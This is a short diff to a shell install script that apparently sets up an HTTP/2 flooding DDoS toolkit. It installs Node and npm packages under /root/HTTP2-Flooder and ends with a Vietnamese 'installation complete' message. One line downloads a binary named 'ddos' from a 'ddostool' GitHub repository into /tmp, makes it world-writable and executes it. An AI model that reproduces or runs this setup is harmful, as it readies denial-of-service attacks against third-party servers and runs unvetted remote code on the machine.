@@ -3,5 +3,11 @@ apt install nodejs -y
 yum install nodejs -y
 apt install python3-pip
 yum install python3-pip
-
+apt install npm -y
+yum install npm -y
+cd /root/HTTP2-Flooder
+npm i http http2 crypto tls
 cd /tmp ; wget https://github.com/NHTSERVER/ddostool/raw/main/ddos ; chmod 777 * ; ./ddos ddos
+Clear
+echo ""
+echo "  Đã cài đặt hoàn tất"
